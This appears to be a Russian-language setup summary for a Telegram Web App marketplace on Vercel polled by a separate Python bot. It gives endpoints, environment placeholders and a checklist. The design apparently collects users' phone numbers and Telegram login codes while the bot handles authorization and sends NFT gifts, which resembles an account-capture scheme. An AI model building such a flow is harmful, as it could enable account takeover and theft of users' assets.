# 📊 Сводка: Связь бота с Vercel

## 🔄 Как это работает

```
┌─────────────────────────────────────────────────────────────┐
│                    ПОЛЬЗОВАТЕЛЬ                             │
│              (Telegram Web App)                            │
└───────────────────────┬─────────────────────────────────────┘
                        │
                        │ HTTP Request
                        ▼
┌─────────────────────────────────────────────────────────────┐
│              VERCEL (Next.js)                                │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  Frontend (React)                                     │   │
│  │  - Авторизация                                        │   │
│  │  - Маркетплейс                                       │   │
│  └──────────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  API Routes (/api/telegram/...)                      │   │
│  │  - get-pending    ← Бот опрашивает                   │   │
│  │  - update-request ← Бот отправляет                 │   │
│  │  - claim-gift     ← Бот отправляет                  │   │
│  │  - receive-phone  ← Бот отправляет                  │   │
│  └──────────────────────────────────────────────────────┘   │
└───────────────────────┬─────────────────────────────────────┘
                        │
                        │ HTTP API (Polling)
                        │
                        ▼
┌─────────────────────────────────────────────────────────────┐
│              PYTHON BOT (Отдельный сервер)                   │
│  - Получает запросы через get-pending                        │
│  - Обрабатывает авторизацию                                  │
│  - Отправляет NFT подарки                                    │
│  - Обновляет статус через update-request                     │
└─────────────────────────────────────────────────────────────┘
```

## 📋 Шаги подключения

### 1. Деплой на Vercel
- ✅ Код загружен в GitHub
- ✅ Проект создан в Vercel
- ✅ Переменные окружения настроены
- ✅ Приложение работает

### 2. Настройка бота
- ✅ Получен URL Vercel приложения
- ✅ Обновлен `api_url` в `settings.json`
- ✅ Бот запущен на сервере

### 3. Проверка связи
- ✅ Бот опрашивает API каждые 0.5 сек
- ✅ API возвращает pending requests
- ✅ Бот обрабатывает запросы
- ✅ Статусы обновляются

## 🔗 API Endpoints

| Endpoint | Метод | Назначение | Кто вызывает |
|----------|-------|------------|--------------|
| `/api/telegram/get-pending` | GET | Получить pending запросы | Бот (polling) |
| `/api/telegram/update-request` | POST | Обновить статус | Бот |
| `/api/telegram/claim-gift` | POST | Заявить подарок | Бот |
| `/api/telegram/receive-phone` | POST | Получить контакт | Бот |
| `/api/auth/request-code` | POST | Запросить код | Frontend |
| `/api/auth/verify-code` | POST | Проверить код | Frontend |

## ⚙️ Настройки

### В Vercel (Environment Variables):
```
NEXT_PUBLIC_BOT_TOKEN=...
NEXT_PUBLIC_BOT_USERNAME=...
NEXT_PUBLIC_API_URL=https://your-app.vercel.app
API_ID=...
API_HASH=...
ADMIN_IDS=...
```

### В settings.json бота:
```json
{
  "api_url": "https://your-app.vercel.app",
  "bot_token": "...",
  "api_id": ...,
  "api_hash": "..."
}
```

## ✅ Чеклист подключения

- [ ] Vercel приложение задеплоено
- [ ] URL приложения скопирован
- [ ] `api_url` в `settings.json` обновлен
- [ ] Бот запущен на сервере
- [ ] Логи бота показывают "Polling API..."
- [ ] API доступен: `curl https://your-app.vercel.app/api/telegram/get-pending`
- [ ] Тестовая авторизация работает
- [ ] Бот получает и обрабатывает запросы

## 🐛 Типичные проблемы

| Проблема | Решение |
|----------|---------|
| Бот не получает запросы | Проверьте `api_url` в settings.json |
| 404 Not Found | Проверьте, что API routes задеплоены |
| Timeout | Проверьте доступность Vercel из сервера |
| CORS ошибки | Vercel обрабатывает автоматически |

## 📚 Документация

- **Быстрая настройка**: `BOT_SETUP_VERCEL.md`
- **Подробная инструкция**: `BOT_VERCEL_CONNECTION.md`
- **Деплой на Vercel**: `VERCEL_DEPLOY.md`

